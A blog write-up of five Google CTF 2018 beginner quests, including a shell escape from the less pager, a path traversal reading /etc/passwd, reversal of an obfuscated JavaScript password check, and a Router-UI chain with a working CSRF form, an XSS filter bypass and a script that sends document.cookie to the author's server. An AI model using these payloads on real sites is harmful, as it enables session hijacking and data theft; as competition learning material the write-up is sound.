# Time For Moar Google CTF 2018

[Last time](Google_CTF_2018_1.html), I explored the first five beginner's
quests of Google CTF 2018, and now, it's time for MOAR!

## Moar

The quest prompt gave a `netcat` server address, let's connect and see what's
over on the other side:

```
$ nc moar.ctfcompetition.com 1337
[...]
NAME
       socat - Multipurpose relay (SOcket CAT)

SYNOPSIS
       socat [options] <address> <address>
       socat -V
       socat -h[h[h]] | -?[?[?]]
       filan
       procan
[...]
```

It is the `man` page for `socat`, over the pager `less`. Tying `q` would drop
the connection. What about `h`? It opens the help text, but it is too hard to
read over `netcat`. I opened a local copy of `less` and found:

```
[...]
  !command             Execute the shell command with $SHELL.
  |Xcommand            Pipe file between current pos & mark X to shell command.
[...]
```

Time to try it:

```
$ nc moar.ctfcompetition.com 1337
! ls /
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
! ls ~
ls: cannot access '/home/unprivileged': No such file or directory
! ls /home
moar
! ls /home/moar
disable_dmz.sh
! /home/moar/disable_dmz.sh
Disabling DMZ using password CTF{SOmething-CATastr0phic}
/home/moar/disable_dmz.sh: 18: /home/moar/disable_dmz.sh: cannot create /dev/dmz: Read-only file system
```

And there is the flag.

## Admin UI

Another remote exploitation quest:

```
$ nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit

1
Please enter the backdoo^Wservice password:

abcd
Incorrect, the authorities have been informed!
```

Ops, that's not good. What's in the patch notes?

```
[...]
2
The following patchnotes were found:
 - Version0.3
 - Version0.2
Which patchnotes should be shown?

Version0.3
# Version 0.3
 - Rollback of version 0.2 because of random reasons
 - Blah Blah
 - Fix random reboots at 2:32 every second Friday when it's new-moon.

[...]
Version0.2
# Release 0.2
 - Updated library X to version 0.Y
 - Fixed path traversal bug
 - Improved the UX

[...]
Version0.1
Error: No such file or directory
```

Hum, `No such file or directory`? Looks like it will print any file that
exists. I tried `flag` and `flag.txt`, but it didn't work. Looking closer at
the patch notes, version 0.2 mentions something about path traversal bug fix
and 0.3 rolled that back. Is that a hint?

```
[...]
../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]
```

Oh, it works!

```
[...]
../flag
CTF{I_luv_buggy_sOFtware}
```

## Firmware

I think this challenge is not suppose to be this easy, but 7-Zip is just too
powerful. After opening the archive a few layers, a file system like structure
is shown, and a file named `.mediapc_backdoor_password.gz` is revealed. A plain
text file is inside: `CTF{I_kn0W_tH15_Fs}`.

## JS Safe

The ZIP file only contains an HTML file. Opening it reveals some HTML, CSS, and
two `<script>` tags. The second one seems to be just the basic functionality of
the webpage, and the first one is the one to investigate. Also, it looks like
the password to the safe is also the flag because the following regular
expression is in the second script tag:

```JavaScript
  password = /^CTF{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value);
```

The first script block is (somewhat) obfuscated:

```JavaScript
async function x(password) {
    // TODO: check if they can just use Google to get the password once they understand how this works.
    var code = '<long string removed>'
    var env = {
        a: (x,y) => x[y],
        b: (x,y) => Function.constructor.apply.apply(x, y),
        c: (x,y) => x+y,
        d: (x) => String.fromCharCode(x),
        e: 0,
        f: 1,
        g: new TextEncoder().encode(password),
        h: 0,
    };
    for (var i = 0; i < code.length; i += 4) {
        var [lhs, fn, arg1, arg2] = code.substr(i, 4);
        try {
            env[lhs] = env[fn](env[arg1], env[arg2]);
        } catch(e) {
            env[lhs] = new env[fn](env[arg1], env[arg2]);
        }
        if (env[lhs] instanceof Promise) env[lhs] = await env[lhs];
    }
    return !env.h;
}
```

The `code` string is pretty long, it's probably easier to log out what it does
in runtime:

```JavaScript
// [...]
        try {
            env[lhs] = env[fn](env[arg1], env[arg2]);
            console.log("lhs", env[lhs], "func", env[fn], "args", env[arg1], env[arg2]);
        } catch(e) {
            env[lhs] = new env[fn](env[arg1], env[arg2]);
            console.log("lhs", env[lhs], "new", env[fn], "args", env[arg1], env[arg2]);
        }
// [...]
```

Scrolling over the result, the string `sha-256` and `Uint8Array` of length 32
should be big red flags. The array can be easily encoded to hexadecimal, simply
save it as a temporary global variable then run:

```JavaScript
var temp2 = ""; temp1.forEach(x => { temp2 += x.toString(16).padStart(2, "0"); }); temp2
```

After searching the result in Google, it is just the SHA-256 hash of the input.
Observing the call log closely, it's easy to see that the code is looping over
my SHA-256 array. It's time to add some code to trigger a breakpoint when `lhs`
is `h`, the return value:

```JavaScript
if (lhs === "h") debugger;
```

After the breakpoint hit, it's clear that each value in my SHA-256 array is
XOR-ed by another value, then OR-ed into `h`, since the return value of
function `x` would only be `true` if `h` is `0`, my SHA-256 array needs to
match their array exactly. It's not hard to read out their array manually, but
it's easier with some code, the final function looks like this:

```JavaScript
async function x(password) {
    // TODO: check if they can just use Google to get the password once they understand how this works.
    var code = '<long string removed>';
    var env = {
        a: (x,y) => x[y],
        b: (x,y) => Function.constructor.apply.apply(x, y),
        c: (x,y) => x+y,
        d: (x) => String.fromCharCode(x),
        e: 0,
        f: 1,
        g: new TextEncoder().encode(password),
        h: 0,
    };
    var result = [];
    for (var i = 0; i < code.length; i += 4) {
        var [lhs, fn, arg1, arg2] = code.substr(i, 4);
        try {
            if (env[fn].toString().includes("x[0]^x[1]")) {
                result.push(env[arg1][1]);
            }
            env[lhs] = env[fn](env[arg1], env[arg2]);
            console.log("lhs", env[lhs], "func", env[fn], "args", env[arg1], env[arg2]);
        } catch(e) {
            env[lhs] = new env[fn](env[arg1], env[arg2]);
            console.log("lhs", env[lhs], "new", env[fn], "args", env[arg1], env[arg2]);
        }
        if (env[lhs] instanceof Promise) env[lhs] = await env[lhs];
    }
    result = result.map(x => x.toString(16).padStart(2, "0"));
    console.log(result.join(""));
    return !env.h;
}
```

Entering a random password like `CTF{abcd}`, a SHA-256 hashed value is logged
to the console:

```
e66860546f18cdbbcd86b35e18b525bffc67f772c650cedfe3ff7a0026fa1dee
```

Putting it into Google, `Passw0rd!` comes out, so the flag is `CTF{Passw0rd!}`.

## Router-UI

I personally find this to be pretty difficult for a beginner's quest. You also
need a private server to complete this quest. The quest prompt reads:

```
[...]
If we could find an XSS on the page then we could use it to steal the root
user session token. In case you find something, try to send an email to
wintermuted@googlegroups.com. If you claim your link includes cat pictures,
I'm sure Wintermuted will click it. I hope Chrome's XSS filter will not block
the exploit though.
```

The XSS on the page is pretty obvious, but Chrome's XSS Auditor is pretty
solid. A simple `<script>` tag inserted to `username` field would be enough
to inject my exploit script to Firefox, but I don't think I can convince
Wintermuted to use Firefox.

I tried splitting `<script>` tag to both field, but Chrome somehow still caught
that. I also tried `onerror` of `<img>` tag, nothing. After observing the
server response closely, `//` is added in between `username` and `password`,
and Chrome wouldn't catch it if it is used as part of `src` of a `<script>`
tag.

Since the log in page uses POST, I also need to create a page that submit a
form using a CSRF exploit:

```HTML
<!DOCTYPE html>
<html>
<head>
    <title>Cats Pictures</title>
</head>
<body>
    <form method="POST" action="https://router-ui.web.ctfcompetition.com/login" style="display: none;">
        <input name="username" />
        <input name="password" />
    </form>
    <script>
        const form = document.querySelector("form");
        const [user, pass] = form.querySelectorAll("input");
        user.value = '<script src="https:';
        pass.value = 'blog.jspenguin.com/other/Google_CTF_2018_2/exploit.js"><\/script>';
        form.submit();
    </script>
</body>
</html>
```

The exploit script:

```JavaScript
/**
 * Exploit script for Google CTF 2018.
 */
"use strict";

// Check domain to prevent misuse
if (document.domain === "router-ui.web.ctfcompetition.com") {
    const img = document.createElement("img");
    img.src = "https://jspenguin.com/cat.png?" + btoa(document.cookie);
    document.documentElement.append(img);
}
```

I don't have that file on my server, but the cookies should still land in my
server logs. It's time to send the email:

```
TO: wintermuted@googlegroups.com
Cat Pictures

I want to steal your session cookies, no, I mean I have cat pictures here: https://blog.jspenguin.com/other/Google_CTF_2018_2/portal.html
```

After just a few seconds, I got a reply, probably from a bot:

```
Thanks for the link!

Thanks for the  
link "https://blog.jspenguin.com/other/Google_CTF_2018_2/portal.html", I'll  
check it out as soon as possible!
```

Soon after, the cookie landed in my server log:

```
[...] /cat.png?ZmxhZz1UcnkgdGhlIHNlc3Npb24gY29va2llOyBzZXNzaW9uPUF2YWV2OHRoRGllTTZRdWF1b2gyVHVEZWFlejlXZWph [...]
```

Decoding it gives:

```
flag=Try the session cookie; session=Avaev8thDieM6Quauoh2TuDeaez9Weja
```

After setting the cookie, navigating to the home page no longer redirect
me to the log in page. There are two password fields on the page, opening
Chromium's developer tools, it is easy to see both fields contains the value
`CTF{Kao4pheitot7Ahmu}`.

## That's Five

Router-UI is my favorite quest so far, it's really well designed. It chains
so many common web development mistakes together: CSRF, XSS, session
hijacking, then plain text inside password field. I hope you learnt something,
and stay tuned for the next quests!

Also, from the user agent string, Wintermuted is using Headless Chrome,
probably [Puppeteer](https://github.com/GoogleChrome/puppeteer).
